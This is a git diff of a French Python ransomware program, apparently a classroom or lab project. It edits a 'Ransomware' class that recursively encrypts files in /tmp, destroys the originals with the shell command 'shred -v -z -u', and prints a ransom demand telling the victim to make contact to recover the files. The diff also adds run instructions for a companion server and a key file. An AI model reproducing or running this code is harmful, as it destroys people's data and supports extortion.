@@ -7,9 +7,16 @@ import requests
 import threading
 
 """     A LIRE """
+"""
+Lancer le programme main.py qui chiffrera les fichiers de votre répertoire /tmp, taper :
+    python3 server.py
+Le fichier keyfile.txt que vous voyez
+Sur un autre terminal 2, taper :
+    python3 main.py
+Pour déchiffrer, taper sur terminal 2 : 
+    python3 main.py --action decrypt --keyfile keyfile.txt keyfile
 
-
-
+"""
 """     A LIRE """
 
 
@@ -46,13 +53,8 @@ class Ransomware:
 
     def crypt_tmp(self, tmp_dir, encrypted=False):
         """
-        Recursively encrypts or decrypts files from tmp directory with allowed file extensions
-        Parcourt de façon récursive le dossier /tmp pour accéder à chaque fichier dans chaque sous dossier
+            Chiffre de manière récursive les fichiers qu'on a récupéré 
 
-
-        Args:
-            tmp_dir:str: Absolute path of top level directory
-            encrypt:bool: Specify whether to encrypt or decrypt encountered files
         """
 
 
@@ -94,7 +96,7 @@ class Ransomware:
                 f_dec.write(data)
                 os.system("shred -v -z -u " + file_path +" >/dev/null 2>&1") # redirige les erreurs de la sortie std dans la corbeille
         except OSError:
-            print("FLORIAN")
+            print("")
 
 
 
@@ -123,12 +125,10 @@ if __name__ == '__main__':
             print('Veuillez spécifier le fichier de clé avec --keyfile')
         else:
             rware.read_key(keyfile)
-            #cryptor = Fernet(keyfile)
 
             rware.crypt_tmp(local_tmp, encrypted=True)
     else: # si je ne déchiffre pas, je chiffre
 
         print("Vous avez été sujet à un ransomware, veuillez nous contacter pour espérer retrouver vos fichiers dans /tmp. \n NE RELANCEZ PAS LE main.py SINON VOS FICHIERS SERONT PERDUS.")    
         rware.read_key(keyfile)
-        #cryptor = Fernet(keyfile)
         rware.crypt_tmp(local_tmp) #lancement du chiffrement
